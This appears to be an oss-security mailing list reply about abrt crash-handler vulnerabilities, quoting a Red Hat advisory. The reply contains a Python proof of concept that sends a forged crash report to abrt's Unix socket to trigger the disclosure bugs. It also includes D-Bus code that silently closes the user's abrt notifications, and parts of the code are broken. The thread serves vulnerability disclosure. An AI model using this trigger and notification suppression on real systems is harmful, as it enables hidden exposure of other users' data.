@@ -1,0 +1,122 @@
+
+Date: Fri, 17 Apr 2015 15:54:47 -0500
+From: Grandma Eubanks <tborland1@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Problems in automatic crash analysis frameworks
+
+Just to enter into the fray, I reported a simple dmesg_restrict bypass and
+found a lot of these recent more recent 'information' disclosures a while
+ago with minimal changes:
+
+https://bugzilla.redhat.com/show_bug.cgi?id=1128400
+
+Not a lot of people seem to be looking at this from a triggerable angle
+with the unix domain socket. A simple test I've been running with that
+allows triggers for a lot of these is:
+
+import socket
+from os import strerror
+
+s = socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
+conn = s.connect_ex("/var/run/abrt/abrt.socket")
+if (conn != 0):
+    sleep(2.1)
+    print("ERROR:\t%s" % strerror(conn))
+    conn = s.connect_ex("/var/run/abrt/abrt.socket")
+
+print("Connected, sending...")
+
+s.send("POST / HTTP/1.1\r\n\r\n")
+s.send("type=dumpit\0")
+s.send("reason=anything\0")
+s.send("executable=/usr/lib/systemd/systemd-journald\0")
+s.send("pid=677\0")
+s.send("analyzer=Kerneloops\0")
+
+s.close()
+
+
+By reading some code and looking at the different types of analyzers, most
+of these very recent CVE's easily triggerable without actually needing to
+cause a real crash (just change executable= to any validly installed
+package without 'ProcessUnpackaged' set and some other required fields as
+found by reading through the proper event handler code). And plus, with a
+little dbus play:
+
+def kill_user_notification():
+    # get current notification counter value
+    bus = dbus.SessionBus()
+    bus_object =
+bus.get_object("org.freedesktop.Notifications","/org/freedesktop/Notifications")
+        object_method =
+bus_object.get_dbus_method("Notify","org.freedesktop.Notifications")
+        id_value = ((object_method("",0,"","","","","",1)))
+
+    # kill notification and abrt notification
+    bus = dbus.SessionBus()
+    bus_object =
+bus.get_object("org.freedesktop.Notifications","/org/freedesktop/Notifications")
+    object_method =
+bus_object.get_dbus_method("CloseNotification","org.freedesktop.Notifications")
+    object_method(id_value)
+    sleep(1)
+    object_method(id_value+1)
+
+You no longer trigger notification windows.
+
+On Fri, Apr 17, 2015 at 2:16 PM, Florian Weimer <fweimer@...hat.com> wrote:
+
+> A quick update on the abrt situation.
+>
+> Most of these issues center around file ownership and contents under
+> so-called problem directories (subdirectories of /var/tmp/abrt or
+> /var/spool/abrt).  Problem directories are owned by root and have mode
+> 750 on Red Hat Enterprise Linux 6, which suggest that with this older
+> abrt version, exploits are only possible if uploads are enabled in some
+> way (see below).
+>
+> abrt writes coredumps to existing world-writable files owned by other
+> users, disclosing coredump contents across user boundaries.  This
+> affects a default configuration, but requires an application to crash
+> while its current directory is world-writable, so exploiting it seems
+> difficult.  We have assigned CVE-2015-3142.
+> <https://bugzilla.redhat.com/show_bug.cgi?id=1212818>
+>
+> By default, abrt automatically runs post-crash actions on problem
+> directories (event handling scripts).  These scripts have symlink issues
+> and other race conditions.  This is more or less a repeat of the main
+> abrt-hook-ccpp issue Tavis' reported, but at a higher level.  It means
+> that hardening the file system access in abrt-hook-ccpp is insufficient.
+>  We have assigned CVE-2015-1869:
+> <https://bugzilla.redhat.com/show_bug.cgi?id=1212861>
+>
+> The default event handling scripts add a sosreport file (containing
+> files which are not world-readable) and user-controlled excerpts from
+> /var/log/messages to the user-readable problem directory.  This is an
+> information disclosure flaw, CVE-2015-1870:
+> <https://bugzilla.redhat.com/show_bug.cgi?id=1212868>
+>
+> abrt has an upload functionality which allows, after non-default but
+> documented/supported configuration, other systems to upload crash
+> reports.  This indirectly allows one to create a problem directory with
+> symbolic links and unintended permissions, enabling further attacks.  We
+> treat this as a vulnerability, CVE-2015-3147:
+> <https://bugzilla.redhat.com/show_bug.cgi?id=1212953>
+>
+> As explained in the parallel thread, abrt needs to disable user coredump
+> files in fs.suid_dumpable=2 mode, like the kernel does, and we don't
+> treat this as a vulnerability:
+> <https://bugzilla.redhat.com/show_bug.cgi?id=1212873>
+>
+> It makes sense to have separate abrt-hook-ccpp implementation that does
+> not write user coredump files.  It would not have to write to arbitrary
+> file system locations, so it can be restricted with SELinux.  This
+> enhancement is tracked as:
+> <https://bugzilla.redhat.com/show_bug.cgi?id=1212885>
+>
+> There is a backlog of other issues for which I have not yet filed bugs.
+>
+> --
+> Florian Weimer / Red Hat Product Security
+>
+
